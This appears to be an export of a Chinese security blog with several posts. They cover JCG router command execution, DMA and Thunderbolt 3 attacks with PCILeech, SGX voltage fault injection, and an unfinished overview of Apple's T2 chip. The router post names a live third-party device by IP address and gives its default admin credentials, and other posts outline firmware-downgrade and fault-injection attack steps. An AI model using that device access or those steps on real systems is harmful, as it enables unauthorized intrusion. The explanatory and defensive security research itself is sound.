    <url>/2020/09/12/IOT/Exploit/JCG/JCG%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="JCG路由器命令执行漏洞"><a href="#JCG路由器命令执行漏洞" class="headerlink" title="JCG路由器命令执行漏洞"></a>JCG路由器命令执行漏洞</h2><a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在shadan上搜索相关信息</p>
<p>JHR-N835R</p>
<p>选择其中一个进行测试</p>
<p><a href="http://216.171.4.173/home.asp">http://216.171.4.173/home.asp</a></p>
<p>默认密码：admin/admin</p>
<p>在系统工具中可执行命令</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>JCG</tag>
      </tags>
  </entry>
  <entry>
    <title>DMA攻击和Thunderbolt 3安全级别浅谈</title>
    <url>/2020/11/28/IOT/DMA%E6%94%BB%E5%87%BB%E5%92%8CThunderbolt-3%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E6%B5%85%E8%B0%88/</url>
    <content><![CDATA[<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/DVhR_cLWsAA52bB.jpg" alt="Overview of DMA attacks"></p>
<h2 id="0x00-DMA攻击"><a href="#0x00-DMA攻击" class="headerlink" title="0x00 DMA攻击"></a>0x00 DMA攻击</h2><blockquote>
<p>​    DMA攻击是一种侧信道攻击，即攻击者可以通过利用高速扩展端口，穿透计算机和操作系统，直接读取DMA，DMA包含在许多连接中，DMA可以通过例如便携式摄像机、网卡、存储设备或者其他可直接读取或写入主内存的互动设备。此类设备的合法使用已导致DMA连接广泛，攻击者可以采用工具连接到DMA接口，绕过操作系统的安全机制和屏幕密码等，来访问部分或者全部的计算机物理内存地址，读取计算机的所有工作，窃取数据和加密密钥，安装运行间谍软件和其他漏洞利用程序，或者修改系统以允许后门或其他恶意软件</p>
</blockquote>
<p>允许DMA攻击的设备包括：FireWire、CardBus、ExpressCard、Thunderbolt、PCI和PCI Express</p>
<a id="more"></a>

<h2 id="0x01-DMA-是什么"><a href="#0x01-DMA-是什么" class="headerlink" title="0x01 DMA 是什么"></a>0x01 DMA 是什么</h2><blockquote>
<p>DMA(Direct Memory Access，直接存储器访问) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。否则，CPU 需要从来源把每一片段的资料复制到暂存器，然后把它们再次写回到新的地方。在这个时间中，CPU 对于其他的工作来说就无法使用。</p>
</blockquote>
<p>​    正常情况一般只有CPU才能进入主存，现在加了DMA，直接在I/O设备和主存之间打通了一个通路，用来减少CPU的负担。如果出现DMA和CPU同时访存的情况，DMA优先级更高，当两者争抢时CPU是DMA的小弟卧槽 好家伙我TM直接好家伙。</p>
<p>那么CPU和DMA同时访问主存就会出现一下三种情况：</p>
<h3 id><a href="#" class="headerlink" title></a></h3><p>​    <strong>1.CPU停止访问主存</strong></p>
<p>​            a.CPU放弃地址线的使用权<br>​            b.CPU放弃数据线的使用权<br>​            c.CPU放弃控制线的使用权</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203193831422.png" alt="image-20201203193831422"></p>
<p>优点: 控制简单，它适用于数据传输率很高的设备进行成组传送。</p>
<p>缺点: 在DMA控制器访问内存阶段，内存的效能没有充分发挥，相当一部分内存工作周期是空闲的。这是因为，外围设备传送两个数据之间的间隔一般总是大于内存存储周期，即使高速I/O设备也是如此。例如，软盘读出一个8位二进制数大约需要32us，而半导体内存的存储周期小于0.5us，因此许多空闲的存储周期不能被CPU利用。</p>
<p>​    <strong>2.周期挪用</strong></p>
<p>​    DMA请求时，I/O设备挪用或者窃取总线占用权一个或几个主存周期</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203193850311.png" alt="image-20201203193850311"></p>
<p>I/O设备要求DMA传送时可能遇到两种情况：</p>
<p>​            (1)此时CPU不需要访内，如CPU正在执行乘法指令。由于乘法指令执行时间较长，此时I/O访内与CPU访内没有冲突，即I/O设备挪用一二个内存周期对CPU执行程序没有任何影响。</p>
<p>​            (2)I/O设备要求访内时CPU也要求访内，这就产生了访内冲突，在这种情况下I/O设备访内优先，因为I/O访内有时间要求，前一个I/O数据必须在下一个访问请求到来之前存取完毕。显然，在这种情况下I/O 设备挪用一二个内存周期，意味着CPU延缓了对指令的执行，或者更明确地说，在CPU执行访内指令的过程中插入DMA请求，挪用了一二个内存周期。 与停止CPU访内的DMA方法比较，周期挪用的方法既实现了I/O传送，又较好地发挥了内存和CPU的效率，是一种广泛采用的方法。但是I/O设备每一次周期挪用都有申请总线控制权、建立线控制权和归还总线控制权的过程，所以传送一个字对内存来说要占用一个周期，但对DMA控制器来说一般要2—5个内存周期(视逻辑线路的延迟而定)。因此，周期挪用的方法适用于I/O设备读写周期大于内存存储周期的情况。</p>
<p>3.DMA和CPU交替访问</p>
<p>​            适用于CPU的工作周期比主存存取周期长的情况。这样可以将CPU的周期拆分成两部分，前一部分用于DMA访存，后一部分用于CPU访存</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203194201769.png" alt="image-20201203194201769"></p>
<p>​            这种传送方式又称为“透明的DMA”方式，其来由是这种DMA传送对CPU来说，如同透明的玻璃一般，没有任何感觉或影响。在透明的DMA方式下工作，CPU既不停止主程序的运行，也不进入等待状态，是一种高效率的工作方式。当然，相应的硬件逻辑也就更加复杂。</p>
<h2 id="0x03-Thunderbolt-3-安全等级"><a href="#0x03-Thunderbolt-3-安全等级" class="headerlink" title="0x03 Thunderbolt 3 安全等级"></a>0x03 Thunderbolt 3 安全等级</h2><p><strong>无安全性（SL0）</strong></p>
<blockquote>
<p>在位于SL0模式时，任何Thunderbolt 3设备连接后将立即开始工作。此模式的危险在于，由于Thunderbolt 3支持PCIe，并且PCIe允许直接访问系统内存，因此恶意的Thunderbolt 3设备可以访问系统内存中的潜在敏感数据，而在SL0模式下，只需要简单的插入设备。</p>
</blockquote>
<p><strong>用户授权（SL1）Default</strong></p>
<blockquote>
<p>连接Thunderbolt 3设备时，用户必须响应弹出对话框以明确允许连接。用户可以选择允许一次或始终允许该特定设备。这减轻了上述SL0风险。</p>
</blockquote>
<p><strong>安全连接（SL2）</strong></p>
<blockquote>
<p>与SL1相同，不同之处在于，如果用户选择始终允许特定设备，则系统会向该设备写入加密密钥，并将其记录在其自己的固件中，以执行更强大的“身份验证”使用质询/响应机制在后续连接上对该设备的性能进行评估。这样可以防止攻击者获取已被授予“始终允许”访问权限的外围设备的设备ID并将其克隆到恶意设备上，这在SL1模式下将允许该恶意设备获得“始终允许”访问权限。但是，并非所有的Thunderbolt 3外设都支持SL2。</p>
</blockquote>
<p><strong>仅DisplayPort和USB（SL3）</strong></p>
<blockquote>
<p>通过Thunderbolt 3允许DisplayPort流量，但不允许PCIe。</p>
<p>如果设置安全模式为SL3，并且连接到实际的Thunderbolt 3扩展坞，则将获得视频输出，但将无法使用通过扩展坞的USB控制器运行的任何USB 3.x端口或其他扩展坞功能。（通常包括所有其他端口，以太网，音频等）</p>
</blockquote>
<p><strong>Daisy chaining disabled / USB docks only (SL4)</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4729ovyQtZWmVOd.png" alt="image-20200514221739727"></p>
<blockquote>
<p>SL4 会禁用thunderbolt菊花链，而不是DisplayPort菊花链。</p>
<p>在SL4模式下，允许设备使用PCIe，但仅允许链中的第一个Thunderbolt 3设备。链下游的thunderbolt设备将不允许使用PCIe。</p>
<p>此模式旨在防止恶意的Thunderbolt外围设备通过受信任的设备（例如扩展坞）来访问系统。</p>
</blockquote>
<p><strong>内核DMA保护</strong></p>
<blockquote>
<p>此模式需要系统固件，操作系统，驱动程序和Thunderbolt 3外围设备的支持。</p>
<p>内核DMA保护使系统仅允许外围设备直接访问系统内存的指定部分，从而降低了风险。</p>
<p>如果系统支持内核DMA保护，但所连接的特定Thunderbolt外围设备不支持它，则该系统将退回到该特定设备连接（通常为SL1）</p>
</blockquote>
<h2 id="0x04-攻击方式"><a href="#0x04-攻击方式" class="headerlink" title="0x04 攻击方式"></a>0x04 攻击方式</h2><ol>
<li><p>对于默认采用了SL1的设备，可以通过其主板上的SPI接口dump出Thunderbolt接口控制的固件，对固件进行修改并写回，以此将SL1降级为SL0。</p>
<p>p.s. 在对设备进行写SPI闪存进行降级的时候，可以将审批闪存设置为只读，这样用户就无法通过BIOS更改 Thunderbolt接口 的安全等级。</p>
</li>
<li><p>降级成功后通过Thunderbolt接口连接被攻击的设备，执行DMA攻击（PCILeech 攻击程序）</p>
<blockquote>
<p>PCILeech部分功能:</p>
<ul>
<li>可以通过&gt;150MB/s的速度检索内存</li>
<li>将数据写入目标内存</li>
<li>将活动的RAM挂载位文件</li>
<li>将文件系统挂载为驱动器</li>
<li>在目标系统上执行内核代码</li>
<li>解锁系统</li>
</ul>
</blockquote>
</li>
</ol>
<p>PCILeech攻击使用PCIe硬件设备读取和写入目标系统内存。这是通过在PCIe上使用DMA来实现的。目标系统上不需要驱动程序。</p>
<p>PCILeech还可以在没有硬件的情况下运行，并可以使用LeechCore库支持的多种软件内存获取方法-包括使用DumpIt或WinPmem捕获远程实时内存。PCILeech还支持本地捕获内存和多种内存转储文件格式。</p>
<p>支持多个内存采集器比如：</p>
<p>1.基于USB3380的硬件（基于USB3380的硬件只能本地读取4GB内存，但是如果首先将内核模块(KMD)插入目标系统内核，则可以读取所有内存。）<br>2.基于FPGA</p>
<p>支持的目标系统：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UEFI</span><br><span class="line">Linux</span><br><span class="line">FreeBSD</span><br><span class="line">macOS（不支持macOS High Sierra及更高版本）</span><br><span class="line">Windows</span><br></pre></td></tr></table></figure>

<p>​    这需要有内存（USB3380硬件，FPGA硬件或CVE-2018-1038“ Total Meltdown”）的写访问权。</p>
<h2 id="0x05-安全思考"><a href="#0x05-安全思考" class="headerlink" title="0x05 安全思考"></a>0x05 安全思考</h2><p>1.设备位于SL1模式下，是否可以 窃取\克隆 已经获得授权的设备ID，以此获得无提示的设备接入。<br>2.针对上一点作出防御的SL2模式，如果在THunderbolt 3外设不支持SL2的情况下会自动降级到SL1。攻击者完全可以随心所欲降级。SL2如果不是强制实施的话等于无效</p>
<h2 id="0x08-如何缓解"><a href="#0x08-如何缓解" class="headerlink" title="0x08 如何缓解"></a>0x08 如何缓解</h2><p>BIOS中启用VT-d(IOMMU)防护DMA攻击<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203195328413.png" alt="image-20201203195328413"></p>
<h2 id="0x09-参考链接"><a href="#0x09-参考链接" class="headerlink" title="0x09 参考链接"></a>0x09 参考链接</h2><p><a href="https://en.wikipedia.org/wiki/DMA_attack">https://en.wikipedia.org/wiki/DMA_attack</a><br><a href="https://baike.baidu.com/item/DMA/2385376">https://baike.baidu.com/item/DMA/2385376</a><br><a href="https://github.com/ufrisk/pcileech">https://github.com/ufrisk/pcileech</a><br><a href="https://www.anquanke.com/post/id/86840">https://www.anquanke.com/post/id/86840</a><br><a href="https://github.com/LuckyPi/PushPin">https://github.com/LuckyPi/PushPin</a><br><a href="https://www.youtube.com/watch?v=mca3rLsHuTA">https://www.youtube.com/watch?v=mca3rLsHuTA</a><br><a href="https://zhuanlan.zhihu.com/p/50640466">https://zhuanlan.zhihu.com/p/50640466</a><br><a href="https://docs.microsoft.com/zh-cn/windows/security/information-protection/kernel-dma-protection-for-thunderbolt">https://docs.microsoft.com/zh-cn/windows/security/information-protection/kernel-dma-protection-for-thunderbolt</a><br><a href="https://www.youtube.com/watch?v=7uvSZA1F9os">https://www.youtube.com/watch?v=7uvSZA1F9os</a><br><a href="https://www.youtube.com/watch?v=oEfzp4lHpB0">https://www.youtube.com/watch?v=oEfzp4lHpB0</a><br><a href="http://lordcasser.com/2020/07/01/thunderbolt/">http://lordcasser.com/2020/07/01/thunderbolt/</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>DMA</tag>
        <tag>Thunderbolt 3</tag>
      </tags>
  </entry>
  <entry>
    <title>SGX攻击浅谈</title>
    <url>/2020/12/01/IOT/SGX%E6%94%BB%E5%87%BB%E6%B5%85%E8%B0%88/</url>
    <content><![CDATA[<h1 id="Base-SGX-Attack"><a href="#Base-SGX-Attack" class="headerlink" title="Base-SGX-Attack"></a>Base-SGX-Attack</h1><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/Intel-SGX-enclave.jpg" alt="SgxPectre attack allows to reveal the content of the SGX enclaveSecurity  Affairs"></p>
<h2 id="0x00-起源研究"><a href="#0x00-起源研究" class="headerlink" title="0x00 起源研究"></a>0x00 起源研究</h2><h3 id="1-VOLTpwn（software-based）"><a href="#1-VOLTpwn（software-based）" class="headerlink" title="1.VOLTpwn（software-based）"></a>1.VOLTpwn（software-based）</h3><h4 id="a-介绍"><a href="#a-介绍" class="headerlink" title="a.介绍"></a>a.介绍</h4><blockquote>
<p>VOLTpwn(CVE-2019-11157)是通过Intel处理器提供的用于控制CPU电压的软件接口MSR（Model Specific Register）0x150 来实现基于电压的故障注入</p>
</blockquote>
<p>#目前为止未公布POC代码</p>
<a id="more"></a>

<h4 id="a-危害"><a href="#a-危害" class="headerlink" title="a.危害"></a>a.危害</h4><p>​        通过恶意软件可以使用此接口将处理器电压降低到一个临界阀值，在该阀值下某些指令将无法正常运行。这意味着攻击者能够在使用这些指令实现的计算机中实现的计算中引起位翻转。因此攻击者能够操纵密码计算，甚至偏离程序的控制流程</p>
<h4 id="b-局限性"><a href="#b-局限性" class="headerlink" title="b.局限性"></a>b.局限性</h4><p>​        由于攻击是由软件控制的，因此攻击者不需要物理访问计算机。但是，攻击者需要操作系统特权才能使用电压接口。这意味着该漏洞并不直接威胁普通用户。主要目标是受信任的执行环境，例如intel sgx</p>
<h4 id="c-如何修复"><a href="#c-如何修复" class="headerlink" title="c.如何修复"></a>c.如何修复</h4><p>​        大部分用户用不到基于软件的电压调节接口，将intel 该接口禁用即可</p>
<h3 id="2-VoltPillager（Hardware-based）"><a href="#2-VoltPillager（Hardware-based）" class="headerlink" title="2.VoltPillager（Hardware-based）"></a>2.VoltPillager（Hardware-based）</h3><h4 id="a-介绍-1"><a href="#a-介绍-1" class="headerlink" title="a.介绍"></a>a.介绍</h4><blockquote>
<p>在VOLTpwn的基础上，针对intel将基于软件的电压调节禁用以缓解故障注入对SGX的影响，提出了使用硬件手段来进行攻击。</p>
</blockquote>
<h4 id="b-影响"><a href="#b-影响" class="headerlink" title="b.影响"></a>b.影响</h4><p>​        打破了公认的“SGX可以在硬件计算服务提供商是恶意的情况下保证用户数据和计算过程的安全性”这个前提</p>
<h2 id="0x01-Intel®-SGX"><a href="#0x01-Intel®-SGX" class="headerlink" title="0x01 Intel® SGX"></a>0x01 Intel® SGX</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><blockquote>
<p>Intel® Software Guard Extensions (Intel® SGX)保护选定的代码和数据不被泄露和修改。开发者可以把应用程序划分到CPU强化的encalve（飞地）中或者内存中可执行的保护区域，即使在受攻击的平台中也能提高安全性。</p>
</blockquote>
<h3 id="2-特性"><a href="#2-特性" class="headerlink" title="2.特性"></a>2.特性</h3><h4 id="a-机密性和完整性"><a href="#a-机密性和完整性" class="headerlink" title="a.机密性和完整性"></a>a.机密性和完整性</h4><p>​        即使在OS、BIOS、VMM或者SMM层存在特权恶意软件的情况下也能保证。</p>
<h4 id="b-低学习曲线"><a href="#b-低学习曲线" class="headerlink" title="b.低学习曲线"></a>b.低学习曲线</h4><p>​        和父类应用程序蕾丝的OS编程模型，并且在主CPU上执行。</p>
<h4 id="c-远程认证和提供"><a href="#c-远程认证和提供" class="headerlink" title="c.远程认证和提供"></a>c.远程认证和提供</h4><p>​        远程部分能够认证一个应用程序enclave的身份，并且安全地将密钥、凭据和敏感数据提供给enclave</p>
<h4 id="d-最小可能的攻击面"><a href="#d-最小可能的攻击面" class="headerlink" title="d.最小可能的攻击面"></a>d.最小可能的攻击面</h4><p>​        CPU边界成为攻击面外围，所有数据、内存、外围之外的I/O都是加密的。</p>
<h3 id="3-解决的问题"><a href="#3-解决的问题" class="headerlink" title="3.解决的问题"></a>3.解决的问题</h3><h4 id="传统应用程序的的约束"><a href="#传统应用程序的的约束" class="headerlink" title="传统应用程序的的约束"></a>传统应用程序的的约束</h4><p>​        开发者长期以来受到主要平台提供商暴露给应用开发的安全能力的限制。黑客也一样熟悉这些功能，他们能够利用弱点来加密敏感数据、凭据或者劫持代码来进行攻击。开发者必须依赖提供商的安全架构，在平台发布之后，他们没有能力设计一个符合他们需求的安全模型。</p>
<h3 id="4-提供新的方法"><a href="#4-提供新的方法" class="headerlink" title="4.提供新的方法"></a>4.提供新的方法</h3><p>​        Intel设计了一个可能具有最小攻击面的硬件辅助的可信执行环境：CPU边界。Intel SGX提供了17种新的Intel®架构指令，应用程序可以用来为代码和数据设置保留的私有区域，也能够阻止对执行中代码和内存中数据进行的直接攻击。</p>
<h4 id="开发intel-SGX保护的应用程序"><a href="#开发intel-SGX保护的应用程序" class="headerlink" title="开发intel SGX保护的应用程序"></a>开发intel SGX保护的应用程序</h4><h5 id="a-组成"><a href="#a-组成" class="headerlink" title="a.组成"></a>a.组成</h5><ul>
<li>不可信代码</li>
<li>可信代码enclave(可以被安全调用)</li>
</ul>
<h5 id="b-运行流程"><a href="#b-运行流程" class="headerlink" title="b.运行流程"></a>b.运行流程</h5><ul>
<li>1.App由可信和不可信部分构成</li>
<li>2.App运行和穿件enclave，enclave放入可信内存中</li>
<li>3.可信函数被调用，执行会转换到enclave中</li>
<li>4.enclave可以访问所有进程数据，外部要访问encalve数据被禁止</li>
<li>5.可信函数返回enclave数据</li>
<li>6.App进行执行不同代码</li>
</ul>
<h5 id="c-认证enclave和加密数据"><a href="#c-认证enclave和加密数据" class="headerlink" title="c.认证enclave和加密数据"></a>c.认证enclave和加密数据</h5><ul>
<li><p>intel SGX使用enclave之间本地认证或者第三方认证的方式来保证应用程序没有收到破坏</p>
<h6 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h6><ul>
<li>1.intel SGX通过指令生成CPU和enclave特定的密封密钥</li>
<li>2.应用程序受保护的部分会被加载到一个enclave</li>
<li>3.对应的代码和数据都会受到测量</li>
<li>4.将对应的报告发送给远端应用程序拥有着的服务器上</li>
<li>5.验证这个enclave报告是不是一个可靠的intel处理器生成的</li>
<li>6.验证成功远端信任并安全的提供密钥、凭证和数据</li>
</ul>
</li>
</ul>
<h5 id="d-可能存在的攻击面"><a href="#d-可能存在的攻击面" class="headerlink" title="d.可能存在的攻击面"></a>d.可能存在的攻击面</h5><ul>
<li>对enclave未授权访问</li>
<li>对enclave内存侦听</li>
</ul>
<h3 id="5-实现新的安全模型和创新"><a href="#5-实现新的安全模型和创新" class="headerlink" title="5.实现新的安全模型和创新"></a>5.实现新的安全模型和创新</h3><h4 id="intel-SGX使用案例"><a href="#intel-SGX使用案例" class="headerlink" title="intel SGX使用案例"></a>intel SGX使用案例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">保护应用程序和数据	Tamper-resistant code tool vendors</span><br><span class="line"></span><br><span class="line">保护支付对话以及云和数据安全	Financial services industry (FSI) companies</span><br><span class="line"></span><br><span class="line">加强生物识别; 强化认证	Security authentication companies</span><br><span class="line"></span><br><span class="line">强化浏览器体验	Browser vendors</span><br><span class="line"></span><br><span class="line">强化DRM，增强高清，4K超高清（UHD）内容保护	Content playback ISVs and content owners across over-the-top (OTT) and media services</span><br><span class="line"></span><br><span class="line">加强终端安全性	Security ISVs and OEMs</span><br><span class="line"></span><br><span class="line">保护通信-终端到管理控制台	Security ISVs</span><br><span class="line"></span><br><span class="line">保护电子病历（EMR），敏感和机密数据	Governments and major health care organizations</span><br><span class="line"></span><br><span class="line">保护本地文件系统上的密钥; 强化磁盘保护	Disk encryption ISVs</span><br><span class="line"></span><br><span class="line">保护密钥管理，优化嵌入式应用程序	Cloud, infrastructure, and SaaS providers</span><br><span class="line"></span><br><span class="line">保护TLS密钥库管理	Cloud, content delivery networks, frequency scanning interferometry (FSI), infrastructure, SaaS</span><br><span class="line"></span><br><span class="line">安全的分析工作负载	Big data ISVs and enterprises</span><br><span class="line"></span><br><span class="line">安全的文档共享和查看	Government and secure document sharing ISVs</span><br><span class="line"></span><br><span class="line">飞地优化的嵌入式应用程序	Major defense contractors</span><br><span class="line"></span><br><span class="line">安全的IoT边界设备和云通信	IoT gateway and device manufacturers</span><br></pre></td></tr></table></figure>



<h2 id="0x02实验准备"><a href="#0x02实验准备" class="headerlink" title="0x02实验准备"></a>0x02实验准备</h2><h4 id="1-System"><a href="#1-System" class="headerlink" title="1.System"></a>1.System</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 1.Ubuntu 18.04.3 LTS 64-bit</span><br><span class="line">- 2.Kernel 5.0.0-23-generic</span><br><span class="line">- 3.Intel SGX driver V2.6</span><br><span class="line"></span><br><span class="line">  - https:&#x2F;&#x2F;github.com&#x2F;intel&#x2F;linux-sgx-driver</span><br><span class="line"></span><br><span class="line">- 4.IntelSGX-SDK V 2.8</span><br><span class="line"></span><br><span class="line">  - https:&#x2F;&#x2F;github.com&#x2F;intel&#x2F;linux-sgx</span><br></pre></td></tr></table></figure>

<h4 id="2-Others"><a href="#2-Others" class="headerlink" title="2.Others"></a>2.Others</h4><p>1.Teensy 4.0 Development Board（350¥）</p>
<p>2 *Bus Driver，you can choose between the following</p>
<ul>
<li><p>b.SN74LVC1G07DRLR（7¥）</p>
</li>
<li><p>a.NL17SZ07XV5T2G（1-3¥）</p>
</li>
</ul>
<p>3.SOT IC Adapter（172¥）</p>
<h2 id="0x03攻击方式"><a href="#0x03攻击方式" class="headerlink" title="0x03攻击方式"></a>0x03攻击方式</h2><h3 id="1-选择明文攻击差分攻击获取AES密钥"><a href="#1-选择明文攻击差分攻击获取AES密钥" class="headerlink" title="1.选择明文攻击差分攻击获取AES密钥"></a>1.选择明文攻击差分攻击获取AES密钥</h3><h3 id="2-延迟写攻击"><a href="#2-延迟写攻击" class="headerlink" title="2.延迟写攻击"></a>2.延迟写攻击</h3><p>​        作者发现在拉低电压的情况下会出现写操作延迟，流水线调度出现问题，造成结果错误的问题。</p>
<p>eg：流水线已经执行下一条数据相关的指令但是上段流水的写操作尚未完成，导致计算出错，理论上可以用于绕过密码判断等，也可以造成数据写越界</p>
<h3 id="3-攻击步骤"><a href="#3-攻击步骤" class="headerlink" title="3.攻击步骤"></a>3.攻击步骤</h3><p>1.找到主板上的SVID和电压调节器(VR)</p>
<p>2.通过tenssy和其他的工具，并接在SVID总线上，以进行指令注入</p>
<p>3.执行基于电压的故障注入攻击</p>
<h2 id="0x04-缓解方式"><a href="#0x04-缓解方式" class="headerlink" title="0x04 缓解方式"></a>0x04 缓解方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.重新设计协议，增加SVID协议的密码认证</span><br><span class="line"></span><br><span class="line">2.CPU监视总线上的数据包，检测注入的SVID数据包，如果非自己发出的数据包CPU可能依法异常并中止执行</span><br><span class="line"></span><br><span class="line">- 攻击者可以在CPU和VR间充当中间人，隐藏恶意的数据包</span><br><span class="line"></span><br><span class="line">3.检测自身电源电压，如果电压低于以下的值则终止，电压监控电路</span><br><span class="line"></span><br><span class="line">- 不能依赖基于测量CPU电压的缓解措施，SGX不提供信任的方式来访问MSR，因此此类对策都可以通过有问题的操作系统</span><br><span class="line"></span><br><span class="line">4.检测在运行内核上的多个关键代码路径</span><br><span class="line"></span><br><span class="line">- 这种对此对策大量的硬件更改并产生开销</span><br><span class="line"></span><br><span class="line">5.使用完全集成的稳压器（FIVR）</span><br><span class="line"></span><br><span class="line">- 第4代Intel Core SoC（已废弃）</span><br></pre></td></tr></table></figure>



<h2 id="0x05参考链接"><a href="#0x05参考链接" class="headerlink" title="0x05参考链接"></a>0x05参考链接</h2><p><a href="https://www.usenix.org/system/files/sec21summer_chen-zitai.pdf">https://www.usenix.org/system/files/sec21summer_chen-zitai.pdf</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/39976702">https://zhuanlan.zhihu.com/p/39976702</a></p>
<p><a href="https://www.youtube.com/watch?v=5Mr1FCZ7VBQ">https://www.youtube.com/watch?v=5Mr1FCZ7VBQ</a></p>
<p><a href="https://github.com/intel/linux-sgx-driver">https://github.com/intel/linux-sgx-driver</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>SGX</tag>
      </tags>
  </entry>
  <entry>
    <title>Jailbreak_Apple_T2_Chip的相关研究</title>
    <url>/2020/12/03/IOT/Jailbreak-Apple-T2-Chip%E7%9A%84%E7%9B%B8%E5%85%B3%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>先放一张图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215144432769.png" alt="image-20201215144432769"></p>
<a id="more"></a>

<p>更新中…</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/rfh6qOxsLWInTGKc.jpg" alt="Apple T2 chip"></p>
<h2 id="0x00-Apple-T2-芯片"><a href="#0x00-Apple-T2-芯片" class="headerlink" title="0x00 Apple T2 芯片"></a>0x00 Apple T2 芯片</h2><p>首先什么是<strong>苹果T2芯片</strong>呢苹果官网给出的是：Apple T2 安全芯片是 Apple 设计的第二代定制化 Mac 芯片。通过对其他 Mac 电脑中的几款控制器进行重新设计与整合，例如系统管理控制器、图像信号处理器、音频控制器和 SSD 控制器，T2 芯片为 Mac 带来了多项新功能。</p>
<p>例如，T2 芯片让安全性又上新台阶，它所包含的安全隔区协处理器可保护<a href="https://support.apple.com/zh-cn/HT207054">触控 ID</a> 数据，并为新的<a href="https://support.apple.com/zh-cn/HT208344">加密储存</a>和<a href="https://support.apple.com/zh-cn/HT208330">安全启动</a>功能奠定了基础。此外，T2 芯片的图像信号处理器与 FaceTime 高清摄像头配合，进一步提升色调映射和曝光控制，还能基于面部识别技术进行自动曝光并自动调节白平衡。</p>
<p>总结起来就是说是一个值得信赖的安全芯片。T2保护基本功能，例如安全启动，激活锁，Touch ID，加密数据存储，安全启动，图像信号技术等。</p>
<p><strong>Apple T2安全芯片如何工作？</strong>Apple T2芯片可以控制MacOS的启动过程。它可以确保用户安装Apple认可的驱动器。只要在Mac计算机上按下电源按钮，它就会开始工作，一直持续到您看到MacOS桌面为止。换句话说，其主要功能之一就是验证Apple是否已签署您的操作系统和引导程序。</p>
<p>T2还负责硬盘驱动器上的所有加密数据。在以前的Mac版本中，此功能由CPU执行，从而使其负担沉重。通过将这些功能转移到T2芯片上，Apple大大改善了新Mac的性能。T2为CPU提供了更多资源。该芯片可确保MacBook Air和MacBook Pro中提供的Touch ID功能。这些设备中的指纹扫描仪为用户提供了快速登录选项，并批准了管理员级别的请求。Apple T2芯片有助于安全地存储指纹数据。</p>
<p>它还处理来自不同应用程序的验证请求。T2芯片可确保没有应用程序可以通过Touch ID或Face访问您的指纹信息。当请求验证时，Apple T2安全芯片将指纹与安全区协处理器中保护的数据进行比较，并通知结果。</p>
<h2 id="0x01-具备Apple-T2的设备"><a href="#0x01-具备Apple-T2的设备" class="headerlink" title="0x01 具备Apple T2的设备"></a>0x01 具备Apple T2的设备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020 年推出的 iMac</span><br><span class="line">iMac Pro</span><br><span class="line">2019 年推出的 Mac Pro</span><br><span class="line">2018 年推出的 Mac mini</span><br><span class="line">2018 年或之后推出的 MacBook Air</span><br><span class="line">2018 年或之后推出的 MacBook Pro</span><br></pre></td></tr></table></figure>

<p>可以在<strong>“系统信息”</strong>里面查看自己的Mac是否配备了T2芯片</p>
<ol>
<li>在按住 Option 键的同时，选取苹果 () 菜单 &gt;“系统信息”。</li>
</ol>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macos-about-this-mac-system-report-controller-t2.png" alt="img"></p>
<h3 id="对应的Mac的EMC编号如下"><a href="#对应的Mac的EMC编号如下" class="headerlink" title="对应的Mac的EMC编号如下"></a>对应的Mac的EMC编号如下</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iMac Pro：</span><br><span class="line">EMC – 3144（型号A1862 – 2017）</span><br><span class="line"></span><br><span class="line">Mac Pro：</span><br><span class="line">EMC – 3203（模型A1991 – 2019）</span><br><span class="line">EMC – 3413（A2304型（机架）– 2019年）</span><br><span class="line"></span><br><span class="line">Mac Mini：</span><br><span class="line">EMC – 3213（模型A1993 – 2018）</span><br><span class="line">EMC – TBD（TBD型号– 2020）</span><br><span class="line"></span><br><span class="line">MacBook Pro：</span><br><span class="line">EMC – 3214（模型A1989 – 2018）</span><br><span class="line">EMC – 3215（型号A1990 – 2018）</span><br><span class="line">EMC – 3358（A1989型– 2019年）</span><br><span class="line">EMC – 3359（型号A1990 – 2019）</span><br><span class="line">EMC – 3301（型号A2159 – 2019）</span><br><span class="line">EMC – 3347（型号A2141 – 2019）</span><br><span class="line">EMC – 3348（型号A2251 – 2020）</span><br><span class="line">EMC – 3456（型号A2289 – 2020）</span><br><span class="line"></span><br><span class="line">MacBook Air：</span><br><span class="line">EMC – 3184（型号A1932 – 2018和2019）</span><br><span class="line">EMC – 3302（型号A2179 – 2020）</span><br></pre></td></tr></table></figure>

<h3 id="以下模型容易受到攻击"><a href="#以下模型容易受到攻击" class="headerlink" title="以下模型容易受到攻击"></a>以下模型容易受到攻击</h3><table>
